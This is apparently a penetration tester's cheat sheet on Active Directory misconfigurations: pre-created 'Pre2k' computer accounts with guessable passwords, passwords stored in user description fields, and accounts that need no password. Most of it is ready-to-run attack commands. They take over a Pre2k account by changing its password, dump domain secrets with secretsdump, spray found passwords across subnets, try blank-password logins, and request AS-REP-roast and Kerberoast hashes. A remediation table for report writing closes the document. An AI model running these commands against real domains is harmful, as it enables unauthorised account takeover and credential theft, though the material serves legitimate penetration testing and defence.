# Pre2k & AD Misconfigurations

Read the technical blog by [TrustedSec](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts).

---

## Pre-Created Computer Accounts (Pre2k)

### What It Is

When a computer account is pre-created in AD with the **"Pre-Windows 2000 compatible access"** option checked, the account's password is set to the **lowercase computer name** (without the `$`).

Example: account `HOSTA$` → password `hosta`

These accounts are often created and never joined to a domain — so the password **never rotates**. They just sit there with a known password forever.

### How to Identify Them

These accounts have `userAccountControl = 4128` which combines:
- `PASSWD_NOTREQD` (0x0020)
- `WORKSTATION_TRUST_ACCOUNT` (0x1000)

And critically: `logonCount = 0` — the account was never actually used.

```sh
# Find pre2k accounts via LDAP (filter for UAC=4128)
ldapsearch -H ldap://<DC-IP> -x -b "dc=corp,dc=local" \
  "(&(objectClass=computer)(userAccountControl=4128))" sAMAccountName userAccountControl logonCount

# With valid creds via nxc
nxc ldap <DC-IP> -u user -p pass --password-not-required --enabled

# NetExec module
nxc ldap <DC-IP> -u user -p pass -M pre2k
```

### The Attack

The catch: trying to authenticate directly with `HOSTA$:hosta` returns `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` — Windows refuses auth for an unjoined machine account.

**Fix:** Change the password first using RPC, then authenticate normally.

```sh
# Step 1 — Change the password via RPC (you know the current password)
rpcchangepwd.py corp.local/HOSTA\$:'hosta'@<DC-IP> -newpass 'NewPass123!'

# Step 2 — Now authenticate normally with the new password
nxc smb <DC-IP> -u 'HOSTA$' -p 'NewPass123!' -d corp.local
secretsdump.py corp.local/'HOSTA$':'NewPass123!'@<DC-IP>

# Or check what the machine account can access
nxc smb <cidr> -u 'HOSTA$' -p 'NewPass123!' -d corp.local
```

`rpcchangepwd.py` is an Impacket script — may need to grab it from the Impacket examples if not in PATH.

### Why This Matters

Machine accounts (`$`) are domain accounts — they can:
- Be Kerberoasted if they have SPNs
- Be used for BloodHound collection
- Have ACL paths to privileged objects
- Be used for RBCD attacks if machine account quota allows

---

## Passwords in AD Description / Info Fields

### What It Is

Admins sometimes set temporary passwords in the **description** or **info** field of user accounts, then forget to remove them. These fields are readable by **any authenticated domain user** — sometimes even unauthenticated via LDAP anonymous bind.

### How to Find Them

```sh
# nxc — shows description field in output
nxc ldap <DC-IP> -u user -p pass --users
# Look for any description that looks like a password

# Specific LDAP query for descriptions
ldapsearch -H ldap://<DC-IP> -x -D "user@corp.local" -w 'pass' \
  -b "dc=corp,dc=local" "(description=*)" sAMAccountName description

# PowerView (if you have a shell)
Get-DomainUser -Filter {description -ne $null} | Select-Object samaccountname, description

# Anonymous LDAP check (no creds needed if null bind allowed)
ldapsearch -H ldap://<DC-IP> -x -b "dc=corp,dc=local" \
  "(description=*)" sAMAccountName description
```

### What to Do With It

```sh
# Validate the credential
nxc smb <DC-IP> -u found_user -p 'DescriptionPassword' -d corp.local

# Spray it — maybe it's a shared password pattern
nxc smb <cidr> -u users.txt -p 'DescriptionPassword' -d corp.local --continue-on-success
```

---

## PASSWD_NOTREQD Flag

### What It Is

User accounts with `PASSWD_NOTREQD` set in `userAccountControl` are not required to have a password — they can authenticate with a **blank password**.

### How to Find Them

```sh
# nxc module
nxc ldap <DC-IP> -u user -p pass --password-not-required

# LDAP query
ldapsearch -H ldap://<DC-IP> -x -D "user@corp.local" -w 'pass' \
  -b "dc=corp,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" \
  sAMAccountName userAccountControl

# PowerView
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname, useraccountcontrol
```

### The Attack

```sh
# Try blank password authentication
nxc smb <DC-IP> -u found_user -p '' -d corp.local
nxc winrm <cidr> -u found_user -p '' -d corp.local

# These accounts can also be AS-REP roasted if preauthentication is disabled
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip <DC-IP> -no-pass
```

---

## Remediation (For Report Writing)

**Root cause:** These misconfigurations share a common theme — someone took a shortcut and no process exists to catch or remediate them over time.

| Finding | Remediation |
|---|---|
| Pre2k account with default password | Identify all accounts with `logonCount=0` and `UAC=4128`. Either **join the machine to the domain** (which randomizes the password) or **disable/delete** the account if the machine no longer exists. Audit with: `Get-ADComputer -Filter {userAccountControl -band 4128} -Properties logonCount` |
| Password stored in description/info field | Audit all accounts for non-empty description fields: `Get-ADUser -Filter {description -ne "$null"}`. Remove any credentials from description fields and rotate those credentials immediately. Enforce a policy that prohibits storing credentials in AD attributes. |
| PASSWD_NOTREQD accounts | Audit with: `Get-ADUser -Filter {PasswordNotRequired -eq $true}`. Disable the flag (`Set-ADUser -PasswordNotRequired $false`) and require a password on all accounts. This flag is almost never legitimately needed in modern environments. |
| General AD hygiene | Run a regular **AD hygiene review**: accounts with no logon in 90+ days (disable), stale computer accounts (disable/delete), password never expires (flag for review), accounts in privileged groups without justification (remove). |

**Key point for reports:** These are low-effort, high-impact finds. A pre2k account can hand an attacker a free domain credential with zero interaction. The fix is easy; the problem is these accounts are invisible without dedicated tooling.

---

## Quick Misconfig Checklist

Run these any time you have domain credentials — takes 2 minutes and can hand you another account:

```sh
# 1. Users with passwords in description
nxc ldap <DC-IP> -u user -p pass --users | grep -i "desc"

# 2. Accounts with no password required
nxc ldap <DC-IP> -u user -p pass --password-not-required

# 3. Pre2k machine accounts (UAC=4128, logonCount=0)
nxc ldap <DC-IP> -u user -p pass -M pre2k

# 4. AS-REP roastable (no preauth required)
GetNPUsers.py corp.local/user:pass -dc-ip <DC-IP> -request

# 5. Kerberoastable accounts (SPNs set on user accounts)
GetUserSPNs.py corp.local/user:pass -dc-ip <DC-IP> -request
```
